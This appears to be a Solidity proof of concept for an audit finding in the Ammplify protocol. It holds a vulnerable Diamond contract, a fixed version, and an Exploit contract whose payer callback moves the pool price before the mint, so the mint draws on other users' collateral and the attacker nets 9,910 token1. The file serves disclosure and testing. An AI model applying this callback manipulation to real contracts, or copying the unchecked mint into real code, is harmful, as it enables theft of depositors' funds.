// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Ammplify — Sherlock 2025-09, issue 58, H-2
    newMaker quotes token0 and token1 at the current price, then
    RFTLib.settle calls the payer. The payer moves the Uniswap spot
    before PoolWalker mints. The mint pulls the post-move amounts from
    the diamond, which also holds taker collateral. The quoted charge
    is never compared to the amount spent.

    Price 100, taker collateral 100 token0 and 10,000 token1.
    The maker is quoted 10 token0. After the callback the mint takes
    10,000 token1. The attacker nets 9,910 token1.
*/

interface IPayer {
    function tokenRequestCB() external;
}

contract Tok {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function pull(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[msg.sender] += amount;
    }
}

contract Pool {
    Tok public immutable token0;
    Tok public immutable token1;
    uint256 public price = 100;

    constructor(Tok _token0, Tok _token1) {
        token0 = _token0;
        token1 = _token1;
    }

    function quote() public view returns (uint256 amount0, uint256 amount1) {
        if (price <= 100) return (10 ether, 0);
        return (0, 10_000 ether);
    }

    function swapTo(uint256 newPrice, address payer) external {
        if (newPrice == 10_000) {
            token1.pull(payer, 90 ether);
            token0.transfer(payer, 0.09 ether);
        } else {
            token0.pull(payer, 10 ether);
            token1.transfer(payer, 10_000 ether);
        }
        price = newPrice;
    }

    function mintFrom(address payer) external returns (uint256 amount0, uint256 amount1) {
        (amount0, amount1) = quote();
        if (amount0 > 0) token0.pull(payer, amount0);
        if (amount1 > 0) token1.pull(payer, amount1);
    }

    function withdrawLiquidity(address to) external {
        token0.transfer(to, 10 ether);
    }
}

contract Diamond {
    Tok public immutable token0;
    Tok public immutable token1;
    Pool public immutable pool;
    uint256 public charged0;
    uint256 public spent1;

    constructor(Tok _token0, Tok _token1, Pool _pool) {
        token0 = _token0;
        token1 = _token1;
        pool = _pool;
    }

    function newMaker(address payer) external {
        (uint256 charge0, uint256 charge1) = pool.quote();
        charged0 = charge0;
        if (charge0 > 0) token0.pull(payer, charge0);
        if (charge1 > 0) token1.pull(payer, charge1);
        IPayer(payer).tokenRequestCB();
        (, uint256 spent) = pool.mintFrom(address(this));
        // @> VULN: the minted token1 is not checked against the amount quoted and charged
        spent1 = spent;
    }
}

contract DiamondFixed {
    Tok public immutable token0;
    Tok public immutable token1;
    Pool public immutable pool;

    constructor(Tok _token0, Tok _token1, Pool _pool) {
        token0 = _token0;
        token1 = _token1;
        pool = _pool;
    }

    function newMaker(address payer) external {
        (uint256 charge0, uint256 charge1) = pool.quote();
        if (charge0 > 0) token0.pull(payer, charge0);
        if (charge1 > 0) token1.pull(payer, charge1);
        IPayer(payer).tokenRequestCB();
        (uint256 spent0, uint256 spent1) = pool.mintFrom(address(this));
        require(spent0 == charge0 && spent1 == charge1, "mint mismatch");
    }
}

contract Exploit is IPayer {
    Tok public token0;
    Tok public token1;
    Pool public pool;
    Diamond public diamond;
    uint256 public token1Before;

    constructor() {
        token0 = new Tok("T0");
        token1 = new Tok("T1");
        pool = new Pool(token0, token1);
        diamond = new Diamond(token0, token1, pool);
        token0.mint(address(this), 20 ether);
        token1.mint(address(this), 90 ether);
        token0.mint(address(pool), 0.09 ether);
    }

    function tokenRequestCB() external {
        pool.swapTo(10_000, address(this));
    }

    function run() external {
        token1Before = token1.balanceOf(address(this));
        token0.mint(address(diamond), 100 ether);
        token1.mint(address(diamond), 10_000 ether);
        diamond.newMaker(address(this));
        pool.swapTo(100, address(this));
        pool.withdrawLiquidity(address(this));
        require(diamond.charged0() == 10 ether, "quoted 10");
        require(diamond.spent1() == 10_000 ether, "mint took 10000");
        require(token1.balanceOf(address(diamond)) == 0, "collateral gone");
        require(token0.balanceOf(address(diamond)) == 110 ether, "diamond kept the 10");
        require(token1.balanceOf(address(this)) - token1Before == 9_910 ether, "net 9910");
    }
}
